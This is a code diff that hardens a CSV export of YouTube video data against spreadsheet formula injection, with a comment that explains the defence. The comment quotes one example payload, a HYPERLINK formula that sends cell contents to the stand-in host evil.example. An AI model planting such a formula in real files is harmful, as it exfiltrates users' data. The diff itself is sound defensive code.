@@ -60,17 +60,37 @@ function statsOf(cat) {
 }
 
 // ---- export --------------------------------------------------------------
+/*
+ * Every field goes through esc, which does two separate jobs.
+ *
+ * The first is ordinary RFC 4180 quoting, for values containing a comma, a
+ * quote or a newline.
+ *
+ * The second is formula injection. A spreadsheet treats a cell opening with
+ * =, +, - or @ as a formula, and video titles are written by whoever owns the
+ * channel, so they are attacker-controlled text arriving in a file the user
+ * then opens in Excel. A channel can name a video
+ *
+ *     =HYPERLINK("https://evil.example/?d="&A1,"Free stuff")
+ *
+ * and without this it lands in the export live. Quoting alone does not help,
+ * because the spreadsheet strips the CSV quotes before deciding what the cell
+ * is. Prefixing a single quote is what marks the value as literal text, and it
+ * is the standard mitigation for CWE-1236. Leading tab and carriage return are
+ * included because they are also treated as formula starts by some readers.
+ */
 function toCSV(rows) {
   const cols = ["title", "videoId", "url", "durationSeconds", "duration", "views", "published", "approxDaysAgo", "viewsPerDay"];
   const esc = (s) => {
     s = String(s == null ? "" : s);
+    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
     return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
   };
   const lines = [cols.join(",")];
   for (const v of rows) {
     const vpd = v.days ? Math.round(v.views / Math.max(v.days, 1)) : "";
     lines.push([
-      esc(v.title), v.id, "https://youtu.be/" + v.id, v.seconds, esc(fmtDuration(v.seconds)),
+      esc(v.title), esc(v.id), esc("https://youtu.be/" + v.id), v.seconds, esc(fmtDuration(v.seconds)),
       v.views, esc(v.publishedText), v.days != null ? Math.round(v.days) : "", vpd,
     ].join(","));
   }
